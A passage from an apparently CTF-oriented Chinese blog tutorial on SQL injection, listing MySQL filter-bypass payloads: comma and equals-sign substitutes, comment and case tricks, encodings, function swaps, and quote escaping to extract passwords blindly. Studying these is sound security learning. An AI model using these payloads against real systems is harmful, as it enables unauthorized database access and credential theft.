<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">等价于：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ctf_test <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li>
<li><p>功能函数逗号被过滤，例如：substr(),mid()</p>
<p>利用from…for…绕过，pauload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ctf_test <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> if(mid((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li>
<li><p>limit中逗号被过滤</p>
<p>利用limit…offset…绕过，payload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 等价于下面这条<span class="hljs-keyword">SQL</span>语句<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>limit 9 offset 4<code>表示从第十行开始返回4行，返回的是</code>10,11,12,13</p>
</li>
</ol>
<p>等于符号被过滤：</p>
<p>利用like,regexp,between…and…,rlike绕过，payload如下：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) like &#x27;r%&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br>if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) rlike &#x27;^ro&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br>if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) regexp &#x27;^ro&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br>if(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) between &#x27;r&#x27; and &#x27;r&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">between </span>a <span class="hljs-keyword">and </span><span class="hljs-keyword">b：</span><br><span class="hljs-keyword">between </span><span class="hljs-number">1</span> <span class="hljs-keyword">and </span><span class="hljs-number">1</span><span class="hljs-comment">; 等价于 =1</span><br></code></pre></td></tr></table></figure>



<p>关键字绕过：</p>
<ol>
<li><p>使用注释符绕过</p>
<p>常用注释符：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>，-- , <span class="hljs-regexp">/**/</span>, <span class="hljs-comment">#, --+, -- -, ;,%00,--a</span><br></code></pre></td></tr></table></figure></li>
<li><p>大写写绕过</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">-1</span>&#x27;<span class="hljs-built_in">UnIoN</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">SeLeCT</span><br></code></pre></td></tr></table></figure></li>
<li><p>内联注释绕过</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!union*/</span><br></code></pre></td></tr></table></figure></li>
<li><p>大小写绕过</p>
<p>常见双写：aandnd  ununionion seselectlect  自己体会如何双写的。</p>
</li>
</ol>
<p>编码绕过：</p>
<p>　如<code>URLEncode</code>编码，<code>ASCII,HEX,unicode</code>编码绕过：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>即%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">31</span>，而Test也可以为CHAR(<span class="hljs-number">101</span>)+CHAR(<span class="hljs-number">97</span>)+CHAR(<span class="hljs-number">115</span>)+CHAR(<span class="hljs-number">116</span>)。<br></code></pre></td></tr></table></figure>

<p>等价函数替换绕过：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">hex()、bin() ==&gt; ascii()<br><br>benchmark() ==&gt;sleep()<br><br>concat_ws()==&gt;group_concat()<br><br>mid()、substr() ==&gt; substring()<br><br>@@<span class="hljs-keyword">user</span> ==&gt; <span class="hljs-keyword">user</span>()<br><br>@@datadir ==&gt; datadir()<br><br>举例：substring()和substr()无法使用时：?id=<span class="hljs-number">1</span>+<span class="hljs-keyword">and</span>+ascii(lower(mid((<span class="hljs-keyword">select</span>+pwd+<span class="hljs-keyword">from</span>+users+<span class="hljs-keyword">limit</span>+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">74</span>　<br><br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-number">0x70</span><br>strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) = <span class="hljs-number">1</span><br>strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) = <span class="hljs-number">0</span><br>strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) = <span class="hljs-number">-1</span><br><br><span class="hljs-keyword">if</span>函数可用如下语句代替：<br><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> condition <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>



<p>比较符（&gt;,&lt;）绕过：</p>
<p>利用greatest来替代比较符(&lt;,&gt;)</p>
<p>greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>



<p>SQL语句逃逸单引号：</p>
<p>当sql语句结构为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$pwd&#x27;</span><br></code></pre></td></tr></table></figure>

<p>我们可以在username哪里输入admin\</p>
<p>这样sql语句就变为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$pwd&#x27;</span><br></code></pre></td></tr></table></figure>

<p>所以$pwd’就逃逸出来了，所以我们直接在password那里进行sql语句查询就了</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>其实就是一种根据后台语句进行注入的一种漏洞，做<code>sql</code>注入<code>ctf</code>的时候，我们要去猜测后台<code>sql</code>语句的结构，</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
         
          <li><a href="/%5Bobject%20Object%5D">highlight</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.0.2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8EMySQL%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.0.3.</span> <span class="toc-text">与MySQL相关知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.4.</span> <span class="toc-text">有回显的union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%8A%A5%E9%94%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.0.5.</span> <span class="toc-text">有报错的报错注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%A0%E6%8A%A5%E9%94%99%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.6.</span> <span class="toc-text">无回显无报错的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.7.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.8.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REGEXP%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.</span> <span class="toc-text">REGEXP注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">基本注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REGEXP%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">REGEXP盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LIKE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.10.</span> <span class="toc-text">LIKE注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN"><span class="toc-number">1.0.11.</span> <span class="toc-text">IN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Between"><span class="toc-number">1.0.12.</span> <span class="toc-text">Between</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.13.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.0.14.</span> <span class="toc-text">无列名注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%AB%E5%90%8D"><span class="toc-number">1.0.14.1.</span> <span class="toc-text">构造别名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join-%E2%80%A6-using-xx"><span class="toc-number">1.0.14.2.</span> <span class="toc-text">join … using(xx)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%EF%BC%9A"><span class="toc-number">1.0.15.</span> <span class="toc-text">文件读写：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-priv%E5%92%8Csecure-file-priv"><span class="toc-number">1.0.15.1.</span> <span class="toc-text">file_priv和secure-file-priv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.15.2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.15.3.</span> <span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%95"><span class="toc-number">1.0.15.3.1.</span> <span class="toc-text">日志法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLOG%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE-%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E4%B8%BAWindows%E6%89%8D%E5%8F%AF%E7%94%A8"><span class="toc-number">1.0.15.4.</span> <span class="toc-text">DNSLOG外带数据(目标系统为Windows才可用)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.16.</span> <span class="toc-text">约束攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Insert-amp-Update-amp-Delete%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.17.</span> <span class="toc-text">Insert&amp;Update&amp;Delete注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.18.</span> <span class="toc-text">[Mysql下Limit注入方法]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%97%B6%E8%BF%98%E5%8F%AF%E8%83%BD%E6%9C%89%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.19.</span> <span class="toc-text">注入时还可能有的一些方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">1.0.20.</span> <span class="toc-text">一些绕过手法总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.0.21.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&text=SQL注入攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&is_video=false&description=SQL注入攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SQL注入攻击&body=Check out this article: http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&title=SQL注入攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&name=SQL注入攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/&t=SQL注入攻击"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/projects_url">Projects</a></li><!--
     --><!--
       --><li><a href="/%5Bobject%20Object%5D">highlight</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
